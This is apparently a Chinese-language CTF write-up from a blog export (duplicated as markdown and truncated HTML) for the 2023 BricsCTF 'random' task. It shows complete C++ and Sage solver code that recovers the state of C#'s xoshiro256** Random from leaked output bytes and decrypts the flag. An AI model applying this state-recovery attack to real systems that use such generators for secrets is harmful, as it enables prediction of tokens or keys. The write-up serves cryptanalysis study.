的状态转移函数是 GF(2) 下的线性函数，而 `result` 是 `s1` 的非线性函数。如果我们能得到 NextUInt64 的精确返回值，那么就能轻松破解 RNG。我们可以通过乘以乘法逆元来将 `s1` 的每一位表示为初始状态的线性函数，构建一个线性方程组并解出初始状态。但是这道题给出的是 `rng.Next(256)` 的输出，就是只保留 `result` 的高 8 位（草，当时以为是低 8 位）。这样就无法从中获得 `s1` 的任何信息。\n\n我们还可以检查在 `result` 的值确定的情况下，`s1` 的位之间是否存在固定的线性（或仿射）关系：\n\n```python\nfrom sage.all import *\nimport random\ndef f(x):\n    x *= 5\n    x %= 2**64\n    x = (x << 7) | (x >> (64 - 7))\n    x %= 2**64\n    x *= 9\n    x %= 2**64\n    return x >> 56\nvectors = [[] for _ in range(256)]\nfor i in range(100000):\n    a = random.getrandbits(64)\n    v = vector(GF(2), '1' + bin(a)[2:].zfill(64))\n    vectors[f(a)].append(v)\nfor i in range(256):\n    mat = matrix(GF(2), vectors[i])\n    print(mat.rank(), len(vectors[i]))\n```\n\n对于每个 `result` 的值，这个程序生成了一些随机的 `s1` 的可能值，然后计算由这些值的位（和一个 1 来处理异或 1 的子集）生成的矩阵的秩。所有 256 个矩阵的秩都是 65，这意味着向量是独立的，对于任何 `result` 的值都不存在固定的仿射关系，因此无法从中获得任何信息。\n\n> 这里的秩应该是倾向列秩，即他的意思是对于 `s1` 的 bits，不存在哪个 bit 能由其他 bits 线性组合（或者线性组合再取反）后得到。不是很明白检查这个有啥用。\n\n可以获得**概率**线性关系，但是解线性系统就变成了 LPN（Learning Parity with Noise, 带噪声的学习奇偶校验）问题，据我所知，目前还没有足够快的算法。\n\n> LPN 问题具体来说是这样的：给定一个二进制矩阵 $A$ 和一个噪声向量 $e$，求解未知的二进制向量 $s$ 使得 $As + e = b\\pmod2$。其中，$A$ 是一个随机生成的二进制矩阵，$s$ 是一个未知的二进制向量，$e$ 是一个含有少量随机错误的二进制向量，$b$ 是我们观测到的结果向量。噪声向量 $e$ 的存在使得这个问题变得非常困难。\n\n这里可能有多个解；我找到的解是检查**二次关系**：\n\n> 这里不是很懂，为啥没有线性关系就能有二次关系。\n\n- 假设 `result` 的值是固定的，可能存在非平凡的次数 <=2 的布尔函数，当在 `s1` 上取值时总是为真。函数 `f(...) = 1` 符合这个描述，但是不值得考虑，因为它不提供任何信息。\n- 函数可以写成 $$f(x_1, \\dots, x_{64}) = k_0 + \\sum_{i} k_i x_i + \\sum_{i \\le j} k_{ij} x_i x_j,$$ 并且 `s1` 的每一位都可以表示为 $\\sum_i k_i s_i$，其中 s 是初始状态。\n- 我们可以直接将 `s1` 的位的表达式代入 $f$，展开括号并获得对初始状态为真的二次方程。\n\n我们仍然需要找到这些二次布尔函数。这可以通过生成许多随机的 64 位向量来完成，这些向量对应于给定的 `result >> 56` 的值，为它们中的每一个计算所有 $1 + 64 + \\frac{64 \\cdot 63}2 = 2081$ 个单项式，并找到矩阵的核。实现在 `gen_rels.cpp` 中，它平均每个输出字节找到 23 个方程。\n\n这使我们能够在 256 个变量上创建一个超定的二次方程组，它的初始状态是它的（希望是唯一的）解。我用来解决它的算法是线性化：我们可以将每个单项式（如 $x_1x_2$）视为单独的变量。然后我们将有一个线性方程组，其中 $1 + 256 + \\frac{256 \\cdot 255}2 = 32897$ 个变量，可以使用 M4RI 解决。实现在 `hax.cpp` 中，它期望 `gen_rels.cpp` 的输出在文件 `list_rels` 中，`output.txt` 的十六进制解码版本在文件 `out_bin` 中。\n\n> M4RI（Method of Four Russians for Inversion，四俄方法的逆运算方法）是一种针对有限域 GF(2) 上的矩阵运算（特别是矩阵求逆）的高效算法。它的名字来源于一种叫做“四俄罗斯算法”的技术，该技术是为了加速某些基本运算而发明的。\n在 Debian 系中可通过 `sudo apt-get install libm4ri-dev` 安装 M4RI 库。\n\n`gen_rel.cpp` 如下：\n\n```c++\n#include <vector>\n#include <random>\n#include <m4ri/m4ri.h>\n// we need to find degree 2 relations that hold certainly\nuint8_t f(uint64_t x)\n{\n    x *= 5;\n    x = (x << 7) | (x >> (64 - 7));\n    x *= 9;\n    return x >> 56;\n}\nvoid process(uint8_t tgt)\n{\n    std::mt19937_64 mt;\n    size_t n_cols = 1;\n    n_cols += 64;\n    n_cols += 64 * 63 / 2;\n    fprintf(stderr, \"%zu monomials\\n\", n_cols);\n    mzd_t *A = mzd_init(20000, n_cols);\n    for(size_t ri = 0; ri < A->nrows; ri++)\n    {\n        uint64_t x = 0;\n        do\n            x = mt();\n        while(f(x) != tgt);\n        //printf(\"%zu\\n\", x);\n        size_t mi = 0;\n        mzd_write_bit(A, ri, mi++, 1);\n        for(size_t i = 0; i < 64; i++)\n            mzd_write_bit(A, ri, mi++, (x >> i) & 1);\n        for(size_t i = 0; i < 64; i++)\n        for(size_t j = 0; j < i; j++)\n            mzd_write_bit(A, ri, mi++, (x >> i) & (x >> j) & 1);\n        assert(mi == n_cols);\n    }\n    mzd_t* ker = mzd_kernel_left_pluq(A, 0);\n    fprintf(stderr, \"mat dim: %zu rows, %zu cols\\n\", A->nrows, A->ncols);\n    fprintf(stderr, \"ker dim: %zu rows, %zu cols\\n\", ker->nrows, ker->ncols);\n    mzd_t* tker = mzd_transpose(nullptr, ker);\n    fprintf(stderr, \"tker dim: %zu rows, %zu cols\\n\", tker->nrows, tker->ncols);\n    mzd_free(A);\n    mzd_free(ker);\n    /*\n    // check again that the relations are certain (not very fast)\n    for(size_t ri = 0; ri < tker->nrows; ri++)\n    {\n        for(size_t _ = 0; _ < 100000; _++)\n        {\n            uint64_t x = 0;\n            do\n                x = mt();\n            while(f(x) != tgt);\n            //printf(\"%zu\\n\", x);\n            size_t nm = 0;\n            size_t mi = 0;\n            nm ^= mzd_read_bit(tker, ri, mi++);\n            for(size_t i = 0; i < 64; i++)\n                nm ^= mzd_read_bit(tker, ri, mi++) & (x >> i) & 1;\n            for(size_t i = 0; i < 64; i++)\n            for(size_t j = 0; j < i; j++)\n                nm ^= mzd_read_bit(tker, ri, mi++) & (x >> i) & (x >> j) & 1;\n            //assert(mi == n_cols);\n            assert(nm == 0);\n        }\n    }\n    */\n    for(size_t ri = 0; ri < tker->nrows; ri++)\n    {\n        printf(\"%d \", (int)tgt);\n        for(size_t ci = 0; ci < tker->ncols; ci++)\n            printf(\"%d\", (int)mzd_read_bit(tker, ri, ci));\n        printf(\"\\n\");\n    }\n    mzd_free(tker);\n}\nint main()\n{\n    for(size_t i = 0; i < 256; i++)\n        process(i);\n}\n```\n\n`hax.cpp` 如下：\n\n```c++\n#include <array>\n#include <vector>\n#include <random>\n#include <bitset>\n#include <m4ri/m4ri.h>\nuint8_t func(uint64_t x)\n{\n    x *= 5;\n    x = (x << 7) | (x >> (64 - 7));\n    x *= 9;\n    return x >> 56;\n}\nconstexpr size_t N_MONO = 1 + 256 + 256 * 255 / 2;\nusing deg2_rel = std::bitset<1 + 256 + 256 * 255 / 2>;\nusing deg2_rel64 = std::bitset<1 + 64 + 64 * 63 / 2>;\nusing lin_rel = std::bitset<256>;\nstruct sym_u64\n{\n    lin_rel st[64] {};\n    sym_u64& operator^=(const sym_u64& rhs)\n    {\n        for(size_t i = 0; i < 64; i++)\n            st[i] ^= rhs.st[i];\n        return *this;\n    }\n    sym_u64 operator^(const sym_u64& rhs) const\n    {\n        sym_u64 ret = *this;\n        ret ^= rhs;\n        return ret;\n    }\n    sym_u64 operator<<(int by) const\n    {\n        sym_u64 ret {};\n        for(size_t i = 0; i < 64 - by; i++)\n            ret.st[i + by] = st[i];\n        return ret;\n    }\n    sym_u64 operator>>(int by) const\n    {\n        sym_u64 ret {};\n        for(size_t i = 0; i < 64 - by; i++)\n            ret.st[i] = st[i + by];\n        return ret;\n    }\n    sym_u64 rotl(int by) const\n    {\n        sym_u64 ret {};\n        for(size_t i = 0; i < 64; i++)\n            ret.st[(i + by)%64] = st[i];\n        return ret;\n    }\n};\nstruct sym_xs256\n{\n    sym_u64 s0, s1, s2, s3;\n    sym_xs256()\n    {\n        for(size_t i = 0; i < 64; i++)\n        {\n            s0.st[i][i] = true;\n            s1.st[i][i+64] = true;\n            s2.st[i][i+128] = true;\n            s3.st[i][i+192] = true;\n        }\n    }\n    sym_u64 step()\n    {\n        sym_u64 res_s1 = s1;\n        sym_u64 t = s1 << 17;\n        s2 ^= s0;\n        s3 ^= s1;\n        s1 ^= s2;\n        s0 ^= s3;\n        s2 ^= t;\n        s3 = s3.rotl(45);\n        return res_s1;\n    }\n};\nstd::array<std::vector<deg2_rel64>, 256> krels;\ndeg2_rel to_deg2(lin_rel lhs)\n{\n    deg2_rel ret {};\n    for(size_t i = 0; i < 256; i++)\n        ret[i+1] = lhs[i]; // 0 is the constant term\n    return ret;\n}\ndeg2_rel mul(lin_rel lhs, lin_rel rhs)\n{\n    deg2_rel ret {}; // compute the product coefficients directly\n    size_t mi = 1;\n    for(size_t i = 0; i < 256; i++)\n    {\n        ret[mi] = ret[mi] ^ (lhs[i] & rhs[i]);\n        mi++;\n    }\n    for(size_t i = 0; i < 256; i++)\n    for(size_t j = 0; j < i; j++)\n    {\n        ret[mi] = ret[mi] ^ (lhs[i] & rhs[j]);\n        ret[mi] = ret[mi] ^ (lhs[j] & rhs[i]);\n        mi++;\n    }\n    return ret;\n}\nint main()\n{\n    FILE* f = fopen(\"list_rels\", \"r\");\n    while(true)\n    {\n        char buf[4096];\n        int res = 0;\n        int ok = fscanf(f, \"%d%s\", &res, buf);\n        if(ok < 2)\n            break;\n        deg2_rel64 rel {};\n        for(size_t i = 0; i < rel.size(); i++)\n            rel[i] = buf[i] - '0';\n        krels[res].push_back(std::move(rel));\n    }\n    fclose(f);\n    sym_xs256 rng {};\n    // we're targeting the state before the flag is encrypted so skip some bytes now\n    f = fopen(\"out_bin\", \"rb\");\n    constexpr int FLAG_LEN = 41;\n    uint8_t encflag[FLAG_LEN];\n    for(size_t i = 0; i < 41; i++)\n    {\n        encflag[i] = fgetc(f);\n        rng.step();\n    }\n    std::vector<deg2_rel> all_rels;\n    for(size_t i = 0; i < 2000; i++)\n    {\n        fprintf(stderr, \"i=%d\\n\", i);\n        uint8_t outb = fgetc(f);\n        sym_u64 s1 = rng.step();\n        for(const deg2_rel64& big_rel : krels[outb])\n        {\n            deg2_rel res {};\n            size_t mi = 1;\n            if(big_rel[0])\n                res[0] = res[0] ^ 1;\n            for(size_t i = 0; i < 64; i++)\n            {\n                if(big_rel[mi])\n                    res ^= to_deg2(s1.st[i]);\n                mi++;\n            }\n            for(size_t i = 0; i < 64; i++)\n            for(size_t j = 0; j < i; j++)\n            {\n                if(big_rel[mi])\n                    res ^= mul(s1.st[i], s1.st[j]);\n                mi++;\n            }\n            all_rels.push_back(res);\n        }\n    }\n    fclose(f);\n    fprintf(stderr, \"%zu\\n\", all_rels.size());\n    mzd_t *A = mzd_init(all_rels.size(), N_MONO);\n    for(size_t i = 0; i < all_rels.size(); i++)\n    {\n        for(size_t j = 0; j < N_MONO; j++)\n            mzd_write_bit(A, i, j, all_rels[i][j]);\n    }\n    // we solve this system by linearization\n    fprintf(stderr, \"starting solve\\n\");\n    fprintf(stderr, \"mat dim: %zu rows, %zu cols\\n\", A->nrows, A->ncols);\n    mzd_t* ker = mzd_kernel_left_pluq(A, 0);\n    mzd_t* tker = mzd_transpose(nullptr, ker);\n    fprintf(stderr, \"tker dim: %zu rows, %zu cols\\n\", tker->nrows, tker->ncols);\n    mzd_free(A);\n    mzd_free(ker);\n    assert(tker->nrows == 1); // only 1 solution\n    sym_xs256 rng2 {};\n    lin_rel ist; // the initial state. dot product with symbolic output equals concrete output\n    for(size_t j = 0; j < 256; j++)\n        ist[j] = mzd_read_bit(tker, 0, j + 1);\n    for(size_t i = 0; i < FLAG_LEN; i++)\n    {\n        sym_u64 s1 = rng2.step();\n        uint64_t x = 0;\n        for(size_t j = 0; j < 64; j++)\n            x |= uint64_t((s1.st[j] & ist).count() % 2) << j;\n        uint8_t outb = func(x);\n        printf(\"%c\", encflag[i] ^ outb);\n    }\n    printf(\"\\n\");\n}\n```\n\n## 我的想法\n\n首先我感觉这玩意挺抽象的，思路先不谈，光那俩 cpp 除了春哥我不知道还有谁能这么点时间内造出来。\n试着用 sage 写了下 `gen_rels.cpp`，直接慢了几十倍，好吧还是 C++ 厉害。（那之前的 MT19937 的题我是不是可以用 C++ 重写来着，又给自己挖个坑）\n\n先看看 `gen_rels.cpp` 干了些啥：对每一个 0-255 的 target，找到 20000 个能让 `f(x) == target` 的 x，然后把这些 x 的每一位都当作一个变量，构造一个矩阵，然后求这个矩阵的核，这个核就是 `f(x) == target` 的所有关系的矩阵表示。这里的矩阵是 20000*2081 的，然后用 M4RI 求核。\n最终求出的每个向量与其对应 s1 expand 出的二次向量的内积都为 0。\n\n再看 `hax.cpp`，~~疲软了，有空再来补坑。~~\n时隔大半年回来补了（\n\n这里面真是一堆语法可真是把没学过 C++ 的我搞得一头雾水。\n直接用最憨的方法，一个个看。\n\n函数 `func`： 将 `s1` 转成 `result`\n`deg2_rel` 是一个 32897 维的向量，`deg2_rel64` 是 2081 维的向量，`lin_rel` 是 256 维的向量。\nstruct `sym_u64`： 64 维的向量，每一个分量都是一个 `lin_rel`，那么这应该算一个 64*256 的矩阵，并定义其异或、左移、右移、循环左移操作。\nstruct `sym_xs256`： 4 个 `sym_u64` 类型的 `s1 s2 s3 s4`，并定义了 `step` 操作，这里不是很懂，按理说这四个状态向量都是 64 位的。\n定义了一个 `krels`，包含 256 个 `std::vector<deg2_rel64>` 类型的元素。每一个 `std::vector<deg2_rel64>` 可以包含任意数量的 `deg2_rel64` 对象。\n\n现在来看 `main` 函数：\n把 `list_rels` 文件中的内容读入到 `krels` 中。\n创建一个 `sym_xs256` 类的实例 `rng`，然后读进 encflag，每读一个字符更新一次 `rng` 的状态。\n对每一个泄露的字节，找到所有 `krels` 中对应的 `big_rels`，然后对每一个 `big_rels`，新建一个类型为 `deg2_rel` 的 `res`，常数项（0 号位）和 `big_rels` 取等，1-64 号位是 $(b_1, b_2, \\cdots, b_{64})\\cdot(s_1,s_2,\\cdots,s_{64})^T$，左边的 $b$ 即为 `big_rels` 的 1-64 号位，右边是 s1 的 64*256 矩阵。后面没看懂。\n\n最后汇总到的一个 `all_rels`，求核得到的矩阵只有一个 32897 维的向量，剥出 1-256 号位得到 `ist`。\n\n整个看下来就是迷迷糊糊的。\n\n黑化了。\n\nI recently contacted the author of this challenge for assistance and was surprised by his quick response. Despite it being 00:30 when I reached out, he replied by 02:30. Given his username, I assumed he was in Russia, but his response time led me to question whether his work and rest schedule is typical or if he is not currently in Russia.\n\nThe key to understanding the classes `sym_u64` and `sym_xs256` lies in the fact that the four states can be represented as a 256-bit vector. This representation forms a linear system that omits the non-linear scrambler `f(x)`. Thus, the state transition function can be expressed as a matrix, and the `step` function simply performs matrix multiplication. More specifically, the n-th state is obtained by multiplying the transition matrix $T$ by the initial state $n$ times.\n\nThe construction of `res` can be explained as follows:\n\nFirst, it's important to note that `s1` is a 64x256 matrix which, when multiplied by `ist`, yields the current real state of `s1`. Each `s1[i]` is a 256-dimensional vector; its dot product with `ist` determines the i-th bit of the current `s1`.\nFor each `res` in `all_rels`, `res` is computed by multiplying the `big_rel` (a 2081-dimensional vector) by a 2081x256 matrix, which is derived from `s1`.\n\n## 参考\n\n<https://github.com/colgreen/Redzen/blob/main/Redzen/Random/Xoshiro256StarStarRandom.cs>\n<https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/random/README.md>\n","slug":"2023 BricsCTF - random","published":1,"updated":"2024-06-05T07:52:37.151Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zocu00067slz7k0o1i5b","content":"<p>持续复健中。。。</p>\n<span id=\"more\"></span>\n<hr>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>密码太狠了，这题也是 0 解。<br>给了一个 <code>Program.cs</code> 如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> rng = <span class=\"keyword\">new</span> Random();</span><br><span class=\"line\"><span class=\"function\"><span class=\"built_in\">byte</span>[] <span class=\"title\">Encrypt</span>(<span class=\"params\"><span class=\"built_in\">byte</span>[] x</span>)</span> =&gt; x.Select(a=&gt;(<span class=\"built_in\">byte</span>)(a^rng.Next(<span class=\"number\">256</span>))).ToArray();</span><br><span class=\"line\">Console.WriteLine(Convert.ToHexString(Encrypt(File.ReadAllBytes(<span class=\"string\">&quot;flag.txt&quot;</span>))));</span><br><span class=\"line\">Console.WriteLine(Convert.ToHexString(Encrypt(<span class=\"keyword\">new</span> <span class=\"built_in\">byte</span>[<span class=\"number\">2000</span>])));</span><br></pre></td></tr></table></figure>\n\n<p>题文如下:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">This is xoshiro256** 1.0, one of our all-purpose, rock-solid generators. It has excellent (sub-ns) speed, a state (256 bits) that is large enough for any parallel application, and it passes all tests we are aware of.</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>在 GitHub 找到了 <code>xoshiro256** 1.0</code> 的源码，状态更新函数如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ulong</span> t = _s1 &lt;&lt; <span class=\"number\">17</span>;</span><br><span class=\"line\">_s2 ^= _s0;</span><br><span class=\"line\">_s3 ^= _s1;</span><br><span class=\"line\">_s1 ^= _s2;</span><br><span class=\"line\">_s0 ^= _s3;</span><br><span class=\"line\">_s2 ^= t;</span><br><span class=\"line\">_s3 = BitOperations.RotateLeft(_s3, <span class=\"number\">45</span>);</span><br></pre></td></tr></table></figure>\n\n<p>提出 result 的函数如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = BitOperations.RotateLeft(_s1 * <span class=\"number\">5</span>, <span class=\"number\">7</span>) * <span class=\"number\">9</span></span><br></pre></td></tr></table></figure>\n\n<p>看起来也是线性的，一开始想尝试像 MT19937 一样造个状态转移矩阵出来，但是理论上状态转移矩阵是 256 维的，而他给出了 8*2000=16000 个 bit，多太多了，结果也失败了。</p>\n<h2 id=\"题解\"><a href=\"#题解\" class=\"headerlink\" title=\"题解\"></a>题解</h2><p>用 Copilot 翻译一下官方的 wp 先。</p>\n<p>当没有指定 <code>seed</code> 时，64 位机器上的最新版本的 C# 使用 xoshiro256** PRNG：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">internal</span> <span class=\"built_in\">ulong</span> <span class=\"title\">NextUInt64</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">ulong</span> s0 = _s0, s1 = _s1, s2 = _s2, s3 = _s3;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">ulong</span> result = BitOperations.RotateLeft(s1 * <span class=\"number\">5</span>, <span class=\"number\">7</span>) * <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"built_in\">ulong</span> t = s1 &lt;&lt; <span class=\"number\">17</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    s2 ^= s0;</span><br><span class=\"line\">    s3 ^= s1;</span><br><span class=\"line\">    s1 ^= s2;</span><br><span class=\"line\">    s0 ^= s3;</span><br><span class=\"line\"></span><br><span class=\"line\">    s2 ^= t;</span><br><span class=\"line\">    s3 = BitOperations.RotateLeft(s3, <span class=\"number\">45</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    _s0 = s0;</span><br><span class=\"line\">    _s1 = s1;</span><br><span class=\"line\">    _s2 = s2;</span><br><span class=\"line\">    _s3 = s3;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 RNG 的状态转移函数是 GF(2) 下的线性函数，而 <code>result</code> 是 <code>s1</code> 的非线性函数。如果我们能得到 NextUInt64 的精确返回值，那么就能轻松破解 RNG。我们可以通过乘以乘法逆元来将 <code>s1</code> 的每一位表示为初始状态的线性函数，构建一个线性方程组并解出初始状态。但是这道题给出的是 <code>rng.Next(256)</code> 的输出，就是只保留 <code>result</code> 的高 8 位（草，当时以为是低 8 位）。这样就无法从中获得 <code>s1</code> 的任何信息。</p>\n<p>我们还可以检查在 <code>result</code> 的值确定的情况下，<code>s1</code> 的位之间是否存在固定的线性（或仿射）关系：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    x *= <span class=\"number\">5</span></span><br><span class=\"line\">    x %= <span class=\"number\">2</span>**<span class=\"number\">64</span></span><br><span class=\"line\">    x = (x &lt;&lt; <span class=\"number\">7</span>) | (x &gt;&gt; (<span class=\"number\">64</span> - <span class=\"number\">7</span>))</span><br><span class=\"line\">    x %= <span class=\"number\">2</span>**<span class=\"number\">64</span></span><br><span class=\"line\">    x *= <span class=\"number\">9</span></span><br><span class=\"line\">    x %= <span class=\"number\">2</span>**<span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> x &gt;&gt; <span class=\"number\">56</span></span><br><span class=\"line\">vectors = [[] <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>)]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100000</span>):</span><br><span class=\"line\">    a = random.getrandbits(<span class=\"number\">64</span>)</span><br><span class=\"line\">    v = vector(GF(<span class=\"number\">2</span>), <span class=\"string\">&#x27;1&#x27;</span> + <span class=\"built_in\">bin</span>(a)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">64</span>))</span><br><span class=\"line\">    vectors[f(a)].append(v)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">    mat = matrix(GF(<span class=\"number\">2</span>), vectors[i])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(mat.rank(), <span class=\"built_in\">len</span>(vectors[i]))</span><br></pre></td></tr></table></figure>\n\n<p>对于每个 <code>result</code> 的值，这个程序生成了一些随机的 <code>s1</code> 的可能值，然后计算由这些值的位（和一个 1 来处理异或 1 的子集）生成的矩阵的秩。所有 256 个矩阵的秩都是 65，这意味着向量是独立的，对于任何 <code>result</code> 的值都不存在固定的仿射关系，因此无法从中获得任何信息。</p>\n<blockquote>\n<p>这里的秩应该是倾向列秩，即他的意思是对于 <code>s1</code> 的 bits，不存在哪个 bit 能由其他 bits 线性组合（或者线性组合再取反）后得到。不是很明白检查这个有啥用。</p>\n</blockquote>\n<p>可以获得<strong>概率</strong>线性关系，但是解线性系统就变成了 LPN（Learning Parity with Noise, 带噪声的学习奇偶校验）问题，据我所知，目前还没有足够快的算法。</p>\n<blockquote>\n<p>LPN 问题具体来说是这样的：给定一个二进制矩阵 $A$ 和一个噪声向量 $e$，求解未知的二进制向量 $s$ 使得 $As + e = b\\pmod2$。其中，$A$ 是一个随机生成的二进制矩阵，$s$ 是一个未知的二进制向量，$e$ 是一个含有少量随机错误的二进制向量，$b$ 是我们观测到的结果向量。噪声向量 $e$ 的存在使得这个问题变得非常困难。</p>\n</blockquote>\n<p>这里可能有多个解；我找到的解是检查<strong>二次关系</strong>：</p>\n<blockquote>\n<p>这里不是很懂，为啥没有线性关系就能有二次关系。</p>\n</blockquote>\n<ul>\n<li>假设 <code>result</code> 的值是固定的，可能存在非平凡的次数 &lt;=2 的布尔函数，当在 <code>s1</code> 上取值时总是为真。函数 <code>f(...) = 1</code> 符合这个描述，但是不值得考虑，因为它不提供任何信息。</li>\n<li>函数可以写成 $$f(x_1, \\dots, x_{64}) = k_0 + \\sum_{i} k_i x_i + \\sum_{i \\le j} k_{ij} x_i x_j,$$ 并且 <code>s1</code> 的每一位都可以表示为 $\\sum_i k_i s_i$，其中 s 是初始状态。</li>\n<li>我们可以直接将 <code>s1</code> 的位的表达式代入 $f$，展开括号并获得对初始状态为真的二次方程。</li>\n</ul>\n<p>我们仍然需要找到这些二次布尔函数。这可以通过生成许多随机的 64 位向量来完成，这些向量对应于给定的 <code>result &gt;&gt; 56</code> 的值，为它们中的每一个计算所有 $1 + 64 + \\frac{64 \\cdot 63}2 = 2081$ 个单项式，并找到矩阵的核。实现在 <code>gen_rels.cpp</code> 中，它平均每个输出字节找到 23 个方程。</p>\n<p>这使我们能够在 256 个变量上创建一个超定的二次方程组，它的初始状态是它的（希望是唯一的）解。我用来解决它的算法是线性化：我们可以将每个单项式（如 $x_1x_2$）视为单独的变量。然后我们将有一个线性方程组，其中 $1 + 256 + \\frac{256 \\cdot 255}2 = 32897$ 个变量，可以使用 M4RI 解决。实现在 <code>hax.cpp</code> 中，它期望 <code>gen_rels.cpp</code> 的输出在文件 <code>list_rels</code> 中，<code>output.txt</code> 的十六进制解码版本在文件 <code>out_bin</code> 中。</p>\n<blockquote>\n<p>M4RI（Method of Four Russians for Inversion，四俄方法的逆运算方法）是一种针对有限域 GF(2) 上的矩阵运算（特别是矩阵求逆）的高效算法。它的名字来源于一种叫做“四俄罗斯算法”的技术，该技术是为了加速某些基本运算而发明的。<br>在 Debian 系中可通过 <code>sudo apt-get install libm4ri-dev</code> 安装 M4RI 库。</p>\n</blockquote>\n<p><code>gen_rel.cpp</code> 如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span 